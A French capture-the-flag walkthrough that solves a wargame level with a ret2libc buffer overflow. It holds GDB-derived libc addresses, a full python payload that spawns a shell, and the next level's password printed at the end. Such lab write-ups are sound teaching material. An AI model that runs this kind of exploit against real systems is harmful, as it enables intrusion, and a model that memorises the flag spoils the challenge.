En utilisant disass de GDB on voit l'utilisation de la fonction p()
en allant voir la fonction p() on remarque l'utilisation de gets ( qui va nous permettre d'utiliser un buffer overflow )
Mais apres gets() la fonction p va verifier l'adresse de retour de la fonction avec 0xb0000000
Nous ne pouvont donc pas overwrite EIP afin qu'il lance une fonction avec comme adresse 0xb.

En revanche on peut utiliser un ret2libc ce qui va nous permettre de bypass la verification de notre eip et donc de quand meme executer notre command pour lancer le shell.

Un ret2libc se forme comme ceci:

"notre buffer size max" + "l'adresse du return de la fonction p" + "l'adresse de la fonction system" + "l'adresse de la fonction exit ( qui sert de fonction de retour pour system )" + " notre argument pour la fonction system donc l'adresse de la string /bin/sh"

On peut recuperer toutes ces informations via gdb:
Il suffit de break le programme puis d'executer:

(adresse de system()) print &system --> 0xb7e6b060
(adresse de exit()) print &exit   --> 0xb7e5ebe0
(ret) disass p     --> 0x0804853e
(adresse de la string "/bin/sh") find &system, +9999999, "/bin/sh" --> 0xb7f8cc58


Il nous manque que l'offset afin de savoir quel taille fait notre buffer.
j'utilise un generateur de pattern pour faciliter la tache
( wiremask.eu   buffer overflow pattern generator)

La taille du buffer est donc de 80.

Nous pouvons donc maintenant faire notre input ( attention au little endian )
python -c "print('\x90'*80 + '\x3e\x85\x04\x08' + '\x60\xb0\xe6\xb7' + '\xe0\xeb\xe5\xb7' + '\x58\xcc\xf8\xb7')"

on ajoute juste la commande cat pour que le shell reste actif.

(python -c "print('\x90'*80 + '\x3e\x85\x04\x08' + '\x60\xb0\xe6\xb7' + '\xe0\xeb\xe5\xb7' + '\x58\xcc\xf8\xb7')" ; cat) | ./level2

cat /home/level3/.pass

492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
